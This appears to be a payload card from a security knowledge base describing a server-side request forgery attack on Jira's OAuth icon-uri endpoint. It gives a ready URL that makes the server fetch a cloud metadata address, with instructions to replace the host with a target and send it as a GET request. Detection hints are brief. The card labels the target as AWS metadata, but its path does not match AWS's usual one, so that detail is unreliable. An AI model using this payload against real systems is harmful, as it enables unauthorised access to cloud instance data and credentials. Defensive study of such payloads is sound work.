---
type: code
language: text
verified: true
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:23:59Z'
platforms:
  - Web
tags:
  - ssrf
  - jira
validated: true
---

# jira-oauth-icon-uri-ssrf-payload

## Code

```text
https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance
```

## Description

Specific SSRF payload exploiting Jira's OAuth user icon-uri endpoint to fetch from AWS metadata.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| N/A | Tailored for Jira; replace redacted.com with target | As shown |

## Usage

Send as GET request to vulnerable Jira instance to leak metadata via icon fetch.

## Detection

- Jira access logs for OAuth plugin with internal consumerUri.
- Unusual icon requests.

## Related

- [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata]]
